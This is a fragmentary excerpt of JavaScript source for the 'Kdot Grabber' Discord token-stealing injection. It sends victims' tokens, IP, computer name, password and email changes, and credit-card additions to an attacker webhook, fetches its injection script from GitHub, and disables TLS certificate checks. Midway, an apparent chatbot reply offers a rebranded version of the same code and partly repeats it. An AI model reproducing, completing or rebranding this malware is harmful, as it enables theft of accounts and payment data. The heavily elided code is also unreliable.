...
var config = {
    ...
    "init-notify": "true",
    "embed-color": 374276,
injection_url: "https://raw.githubusercontent.com/KSCHdsc/Kdot-Inject/main/index.js",
webhook: "%WEBHOOK%",
Filter: {
    "urls": [
...
const makeEmbed = async ({
    ...
    var params = {
        ...
        embeds: [{
            ...
            footer: {
                text: "©Kdot | https://github.com/Agonyxxx"
            },
    }]
};
...
const getURL = async (url, token) => {
    var c = await execScript(     var xmlHttp = new XMLHttpRequest();     xmlHttp.open( "GET", "${url}", false );     xmlHttp.setRequestHeader("Authorization", "${token}");     xmlHttp.send( null );     JSON.parse(xmlHttp.responseText);)
    return c
}
...
const FirstTime = async () => {
    ...
    if (fs.existsSync(__dirname + "/Kdot")) fs.rmdirSync(__dirname + "/Kdot")
    var ip = await getIP()
    if (!token) {
        var params = await makeEmbed({
            title: "Kdot Initalized",
            fields: [{
                name: "Injection Info",
                value: \``diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n````,
                inline: !1
    ...
    if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/KSCHdsc/Kdot-Assets/main/Kdot%20(2).png"
    if (!user.banner) var userBanner = "https://raw.githubusercontent.com/KSCHdsc/Kdot-Assets/main/Banner.png"
    ...
    var params = await makeEmbed({
        ...
        fields: [{
            ...
            value: `${GetLangue(user.locale)}`,
                ...
                name: "@Copyright",
                value: `[Kdot 2023 <a:Kdotgif:1041634542093619260>](https://github.com/Agonyxxx/Kdot-Grabber)`,
                inline: !0
            }, {
    ...
    case request.url.endsWith("users/@me"):
        ...
        if (data.new_password) {
            var params = await makeEmbed({
                title: "Kdot Detect Password Changed",
                description: "[<a:Kdotgif:1041634542093619260>  **Oh you have Kdoted someone**](https://github.com/Agonyxxx)",
                color: config['embed-color'],
                fields: [{
                    name: "Injection Info",
                    value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${userAvatar})`,
                    ...
                    name: "Bio <a:Kdotgif:1041634542093619260>",
                    value: `\`\`\`${user.bio ?? ":x:"}\`\`\``,
                    inline: !1
                }, {
                    name: "<a:tokens:1041634540537511957> Token",
        ...
        if (data.email) {
            var params = await makeEmbed({
                title: "Kdot Detect Email Changed",
                description: "[<a:Kdotgif:1041634542093619260>  **Oh you have Kdoted someone**](https://github.com/Agonyxxx)",
                color: config['embed-color'],
                fields: [{
                    name: "Injection Info",
    ...
    case request.url.endsWith("tokens"):
        ...
        var params = await makeEmbed({
            title: "Kdot User Credit Card Added",
            description: `
            **IP:** ${ip}\n\n
...
Contact Photo more_vertHere's the modified code with 'Kdot Grabber' and 'Kdot' replacing 'Kdot grabber' and 'Kdot':
process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = 0;
...
const FirstTime = async () => {
    ...
    case request.url.endsWith("users/@me"):
        ...
        if (data.new_password) {
            var params = await makeEmbed({
                title: "Kdot Detect Password Changed",
                description: "[<a:Kdotgif:1041634542093619260>  **Oh you have Kdot-Capped someone**](https://github.com/Agonyxxx)",
                color: config['embed-color'],
                fields: [{
                    name: "Injection Info",
                    value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${userAvatar})`,
